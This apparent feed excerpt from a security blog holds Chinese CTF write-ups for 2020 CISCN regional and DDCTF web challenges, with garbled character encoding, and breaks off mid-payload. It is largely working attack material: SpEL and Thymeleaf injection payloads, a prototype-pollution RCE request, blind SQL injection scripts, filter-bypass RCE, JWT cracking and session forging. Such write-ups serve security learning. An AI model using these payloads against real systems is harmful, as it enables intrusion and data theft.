      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>2020 CISCN åä¸œåŒ—èµ›åŒº WEB Writeup</title>
    <link href="https://rmb122.com/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/"/>
    <id>https://rmb122.com/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/</id>
    <published>2020-09-19T14:14:55.000Z</published>
    <updated>2020-09-19T17:25:09.958Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€å…± 6 é¢˜ WEB, æˆ‘ä¸€ä¸ªäººæ‹¿äº† 4 ä¸ªä¸€è¡€, è¿˜æœ‰ä¸€é¢˜å…¨åœº 0 è§£. ç„¶è€Œæ²¡æœ‰ pwn çˆ·çˆ·ä¾æ—§è¢«åŠæ‰“, è€Œä¸”é¢˜ç›®è´¨é‡æ˜¯çœŸçš„å·®, æ˜å¹´å†æ‰“å›½èµ›æˆ‘æ˜¯å‚»é€¼.</p><a id="more"></a><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://172.20.29.103:80/flag.php" target="_blank" rel="noopener">http://172.20.29.103:80/flag.php</a> ç›´æ¥è¿”å› flag. ä½ ä»¬èµ›å®æ²¡æœ‰é¢˜ç›®å¤å®¡çš„ä¹ˆ?</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>éšä¾¿ fuzz æ ¹æ®æŠ¥é”™å¾—çŸ¥æ˜¯ seplï¼Œæ„é€  payload T%00 ç»•è¿‡è¿‡æ»¤ç›´æ¥è¯»æ–‡ä»¶å³å¯, fix çš„æ—¶å€™ç»™çœ‹æºç , å‘ç°å‡ºé¢˜äººæ­£åˆ™å†™æˆäº† <code>&quot;T\\\\x00&quot;</code>, åº”è¯¥æ˜¯æƒ³åˆ°äº†è¦è¿‡æ»¤çš„, ä½ ä»¬èµ›å®æ²¡æœ‰é¢˜ç›®å¤å®¡çš„ä¹ˆ? x2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.104:8080</span><br><span class="line">Content-Length: 91</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;172.20.29.104:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;172.20.29.104:8080&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,zh-TW;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">expr&#x3D;T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get%00(&#39;&#x2F;flag.txt&#39;))</span><br></pre></td></tr></table></figure><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>æ‰«å‡ºæ¥åªæœ‰ static æ–‡ä»¶å¤¹ï¼Œæ ¹æ® server header å¾—çŸ¥æœåŠ¡å™¨ç”¨çš„ nginxï¼ŒåŒæ—¶å­˜åœ¨é…ç½®é”™è¯¯ï¼Œå¯ä»¥ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶.<br><a href="http://172.20.29.107/static../app.js" target="_blank" rel="noopener">http://172.20.29.107/static../app.js</a>, åœ¨æºç ä¸­å‘ç°ä½¿ç”¨äº† <code>express-fileupload</code> ï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œå¯ä»¥ç»“åˆ ejs åˆ©ç”¨ï¼Œç›´æ¥ rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.107</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 263</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;------------------------a4826c30ee705335</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--------------------------a4826c30ee705335</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag.txt &gt; flag.txt&#39;);var __tmp2</span><br><span class="line">--------------------------a4826c30ee705335--</span><br></pre></td></tr></table></figure><p>ç„¶åè¯»å– <a href="http://172.20.29.107/static../flag.txt" target="_blank" rel="noopener">http://172.20.29.107/static../flag.txt</a> å³å¯</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>robots.txt å¾—åˆ° hint.txt, å¯ä»¥å¾—åˆ° sql è¯­å¥ï¼Œ æ ¹æ®å…¶ç‰¹æ€§ï¼Œç”¨ \ æ¥æ³¨å…¥ï¼Œ ä¹‹åç»• waf æ³¨å…¥å‡ºå¯†ç ï¼Œç™»é™†åå¾—åˆ° c2ZtdHFs.php, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.102/'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'0x5e'</span></span><br><span class="line">table = string.ascii_letters + <span class="string">'_'</span> + string.digits</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">raw_flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = flag + hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">        <span class="comment">#print(t)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'||password/**/regexp/**/binary/**/%s#'</span> % t</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#print(chr(i))</span></span><br><span class="line">            flag += hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            raw_flag += chr(i)</span><br><span class="line">            print(raw_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">        print(<span class="string">'WARNGIN'</span>)</span><br></pre></td></tr></table></figure><p>ç”¨ &amp; ç»•ä¸€ä¸‹è¿‡æ»¤ï¼Œå³å¯ rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;c2ZtdHFs.php?gzmtu&#x3D;(sysuem%26sysvem)((currenu%26currenv)((weucmmhecders%26oevennheeders)())) HTTP&#x2F;1.1</span><br><span class="line">A: cat &#x2F;flag.txt</span><br><span class="line">Host: 172.20.29.102</span><br></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>pgsql æ³¨å…¥ï¼ŒåŒå†™ç»•è¿‡ selectï¼Œä¹‹åç†Ÿæ‚‰ä¸‹è¯­æ³•å†™è„šæœ¬æ³¨å…¥åç™»é™†å°±æœ‰ flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.105/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_chr</span><span class="params">(inp)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">        ret += <span class="string">f"||chr(<span class="subst">&#123;ord(i)&#125;</span>)"</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits + <span class="string">'_.-'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table = string.printable</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">query = <span class="string">'selselectect/**/password/**/from/**/users/**/limit/**/1/**/OFFSET/**/0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = to_chr(flag) + <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span></span><br><span class="line">        t = t[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (t, query)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">            print(<span class="string">'WARNNING'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">                    t = <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span> + to_chr(flag)</span><br><span class="line">                    t = t[<span class="number">2</span>:]</span><br><span class="line">                    data = &#123;</span><br><span class="line">                        <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">                        <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (</span><br><span class="line">                        t, query)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">                    <span class="comment"># print(res.text)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        flag = chr(i) + flag</span><br><span class="line">                        print(flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">                        print(<span class="string">'WARNNING'</span>)</span><br></pre></td></tr></table></figure><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>è¿™é¢˜ç›®èƒ½æŠŠäººæ°”ç¬‘, å…¨åœº 0 è§£, æœ€åå‘ç°æ”¾äº†ä¸ª ssrf.php, æ— ä»»ä½•æç¤º, å°±ç¡¬çŒœ, è€Œä¸”é‡Œé¢çš„è¿‡æ»¤å†™æˆäº† <code>/file:|http://|php/</code>, è¿™æ˜¯è¿‡æ»¤äº†ä¸ªé”¤å­, ä½ ä»¬èµ›å®æ²¡æœ‰é¢˜ç›®å¤å®¡çš„ä¹ˆ? x3</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€å…± 6 é¢˜ WEB, æˆ‘ä¸€ä¸ªäººæ‹¿äº† 4 ä¸ªä¸€è¡€, è¿˜æœ‰ä¸€é¢˜å…¨åœº 0 è§£. ç„¶è€Œæ²¡æœ‰ pwn çˆ·çˆ·ä¾æ—§è¢«åŠæ‰“, è€Œä¸”é¢˜ç›®è´¨é‡æ˜¯çœŸçš„å·®, æ˜å¹´å†æ‰“å›½èµ›æˆ‘æ˜¯å‚»é€¼.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="ctf" scheme="https://rmb122.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF 2020 Writeup</title>
    <link href="https://rmb122.com/2020/09/07/DDCTF-2020-Writeup/"/>
    <id>https://rmb122.com/2020/09/07/DDCTF-2020-Writeup/</id>
    <published>2020-09-07T13:48:48.000Z</published>
    <updated>2020-09-07T14:01:51.927Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´æ”¹äº†èµ›åˆ¶, å¯ä»¥ä¸¤äººç»„é˜Ÿ, æˆ‘è§‰å¾—æ”¹çš„è¿˜æ˜¯ä¸é”™çš„, ç»ˆäºä¸ç”¨ç°åœºè¡¨æ¼”å­¦ä¹ é€†å‘å’Œ pwn äº†, æˆåŠŸå’Œ Ary å¸ˆå‚…æ‰“åˆ°äº†ç¬¬ä¸‰ 233</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Webç­¾åˆ°é¢˜"><a href="#Webç­¾åˆ°é¢˜" class="headerlink" title="Webç­¾åˆ°é¢˜"></a>Webç­¾åˆ°é¢˜</h3><p>è®¿é—® <a href="http://117.51.136.197/hint/1.txt" target="_blank" rel="noopener">http://117.51.136.197/hint/1.txt</a> å¾—åˆ°ä½¿ç”¨è¯´æ˜ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;117.51.136.197&#x2F;admin&#x2F;login -d &#39;username&#x3D;1&amp;pwd&#x3D;1&#39; -vv</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ2OTA0Mn0.fONrD0R3NLTybq2WEP5V7uWTBI_0T0E5utI3MZFngMU&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾çš„ jwtï¼Œéœ€è¦ç”¨è¿™ä¸ªæ¥ authï¼Œç”¨ <code>https://github.com/brendan-rius/c-jwt-cracker</code> çˆ†ç ´å‡ºæ¥ secret æ˜¯ 1ï¼Œä¿®æ”¹ userRole åˆ° ADMIN å°±å¯ä»¥æ‹¿åˆ°å®¢æˆ·ç«¯çš„åœ°å€ <a href="http://117.51.136.197/B5Itb8dFDaSFWZZo/client" target="_blank" rel="noopener">http://117.51.136.197/B5Itb8dFDaSFWZZo/client</a></p><p>é€†å‘ä¸€ä¸‹å¾—åˆ°ç”¨ç­¾åç®—æ³•ç”¨çš„æ˜¯ hmacï¼Œkey æ˜¯ DDCTFWithYouï¼Œfuzz äº†åŠå¤©å‘ç°æ˜¯ spelï¼Œç›´æ¥å‘½ä»¤æ‰§è¡Œä¼¼ä¹ä¸è¡Œï¼Œäºæ˜¯æ ¹æ®æç¤ºç»™çš„ flag ä½ç½®ç›´æ¥è¯» flag å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"&#123;'a': T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))&#125;"</span></span><br><span class="line">ts = int(time.time())</span><br><span class="line"></span><br><span class="line">sign = base64.b64encode(hmac.new(<span class="string">b'DDCTFWithYou'</span>,msg=<span class="string">f"<span class="subst">&#123;cmd&#125;</span>|<span class="subst">&#123;ts&#125;</span>"</span>.encode(), digestmod=<span class="string">'sha256'</span>).digest())</span><br><span class="line"></span><br><span class="line"><span class="string">'''&#123;"signature":"65+KmCKrBVr6UAsjvSZ/iu1bdpx5xmIJLmAX2Squksk=","command":"'ls'","timestamp":1599189389&#125;'''</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://117.51.136.197/server/command'</span>, json=&#123;</span><br><span class="line">    <span class="string">'signature'</span>: sign.decode(),</span><br><span class="line">    <span class="string">'command'</span>: cmd,</span><br><span class="line">    <span class="string">'timestamp'</span>: ts</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="å¡ç‰‡å•†åº—"><a href="#å¡ç‰‡å•†åº—" class="headerlink" title="å¡ç‰‡å•†åº—"></a>å¡ç‰‡å•†åº—</h3><p>çœ‹åˆ° session å°±çŸ¥é“æ˜æ˜¾çš„æ˜¯ ginï¼Œäºæ˜¯å°è¯•æ•´æ•°æº¢å‡ºï¼Œå€Ÿ 9223372036854775807 ä¸ªå¡ç‰‡å°±å¯ä»¥æˆåŠŸæº¢å‡ºï¼Œåªéœ€è¦è¿˜ 1 å¼ å¡ç‰‡ï¼Œç™½å«– 9223372036854775806 å¼ ï¼Œå…‘æ¢å¾—åˆ°æç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ­å–œä½ ï¼Œä¹°åˆ°äº†ç¤¼ç‰©ï¼Œé‡Œé¢æœ‰å¤¹å¿ƒé¥¼å¹²ã€æœæ¾å­é…’å’Œä¸€å¼ å°çº¸æ¡ï¼Œçº¸æ¡ä¸Šé¢å†™ç€ï¼šurl: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12ï¼Œä½ èƒ½çœ‹æ‡‚å®ƒçš„å«ä¹‰å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>è®¿é—® flag æç¤ºä¸æ˜¯å¹¸è¿ç©å®¶ï¼Œä½†æ˜¯æœ‰äº† secretkey å°±å¯ä»¥ç›´æ¥ä¼ªé€  sessionï¼Œå¯¹ session base64 è§£ç å¯ä»¥å‘ç°ç”¨çš„æ˜¯ gob åºåˆ—åŒ–ï¼Œæ˜æ˜¾çœ‹åˆ° bool, admin å­—æ ·ï¼Œç›´æ¥è‡ªå·±ä¹Ÿæ­ä¸€ä¸ªç¯å¢ƒè®¾ç½®ä¸ª admin session å³å¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-contrib/sessions"</span></span><br><span class="line"><span class="string">"github.com/gin-contrib/sessions/cookie"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">"Udc13VD5adM_c10nPxFu@v12"</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">"session"</span>, store))</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">"/hello"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">"hello"</span>) != <span class="string">"world"</span> &#123;</span><br><span class="line">session.Set(<span class="string">"admin"</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">"hello"</span>: session.Get(<span class="string">"hello"</span>)&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">":8000"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h3><p>deleteMe å¾ˆæ˜æ˜¾çš„ shiroï¼Œä½†æ˜¯å°è¯•äº†ä¸‹ååºåˆ—åŒ–ï¼Œkey å…¨éƒ¨ä¸å¯¹ã€‚äºæ˜¯å°è¯•äº†ä¸‹æ–°çš„æƒé™ç»•è¿‡ï¼Œå¯ä»¥ç›´æ¥è¶Šæƒè®¿é—®åˆ° index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;116.85.37.131&#x2F;34867ccfda85234382210155be32525c&#x2F;;&#x2F;web&#x2F;index</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾æœ‰ä¸ª img æ¥å£å¯ä»¥ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œé€šè¿‡ WEB-INF/web.xml ä¸€ç›´å¥—å¨ƒä¸‹ï¼Œå¯ä»¥ä¸‹åˆ°ä¸€å † classï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰æ¼æ´çš„æ¥å£ï¼Œåœ¨ GitHub ä¸Šæ‰¾äº†ä¸‹ç±»ä¼¼çš„é¡¹ç›®ï¼Œfuzz äº†ä¸€å †é…ç½®æ–‡ä»¶ï¼Œæœ€åæ‰¾åˆ° <code>WEB-INF/classes/spring-shiro.xml</code>.<br>é‡Œé¢æœ‰ä¸ª <code>WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class</code>ï¼Œæ‰¾åˆ°è·¯ç”± <code>map.put(&quot;/68759c96217a32d5b368ad2965f625ef/**&quot;, &quot;authc,roles[admin]&quot;);</code>, è¿›å»å‘ç°æ˜¯ä¸ª thymeleaf æ¸²æŸ“ï¼Œä½†æ˜¯è¦ç»•ä¹‹å‰çš„ com.ctf.util.SafeFilter.</p><p>ç»•äº†åŠå¤©æœ€åç”¨ ProcessBuiler å¼¹ shell å‘ç°è¿ ls éƒ½æ²¡æƒé™æ‰§è¡Œï¼Œäºæ˜¯åªå¥½å›åˆ° java ç”¨ç›¸å…³ API è¯»æ–‡ä»¶ï¼Œæ„é€  payload ç”¨ File æ¥åˆ—ç›®å½•ï¼Œå‘ç° flag å°±åœ¨ /flag_is_here</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># /flag_is_here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    sess = requests.session()</span><br><span class="line">    content = <span class="string">'''</span></span><br><span class="line"><span class="string">    [[$&#123; T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101&#125;)).getConstructors()[1].newInstance(T(String).valueOf(new char[]&#123;47&#125;)).listFiles()[%d] &#125;]]</span></span><br><span class="line"><span class="string">    '''</span>% i</span><br><span class="line">    res = sess.post(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize"</span>, &#123;</span><br><span class="line">        <span class="string">'content'</span>: content</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">#[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 